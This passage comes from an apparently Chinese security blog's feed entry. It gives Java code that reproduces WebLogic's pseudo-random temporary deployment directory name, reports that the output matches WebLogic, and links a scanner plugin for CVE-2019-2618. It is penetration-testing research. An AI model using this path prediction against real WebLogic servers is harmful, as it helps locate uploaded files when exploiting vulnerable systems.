stringBuffer.append(paramString1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Long.toString(Math.abs(stringBuffer.toString().hashCode()), <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String ServerName = args[<span class="number">0</span>];</span><br><span class="line">        String AppName = args[<span class="number">1</span>];</span><br><span class="line">        String AppWarName = AppName + <span class="string">".war"</span>;</span><br><span class="line">        System.out.println(generateTempPath(ServerName,AppName,AppWarName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算结果和weblogic实际生成完全吻合！！！</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/calc.png" alt="计算结果"></p><p>之后的几天逛Github时，发现早就有人发现其规律。</p><p><a href="https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;我们在渗透测试过程中，可以很容易发现weblogic的    &lt;code&gt;serve
      
    
    </summary>
    
      <category term="安全研究" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
</feed>
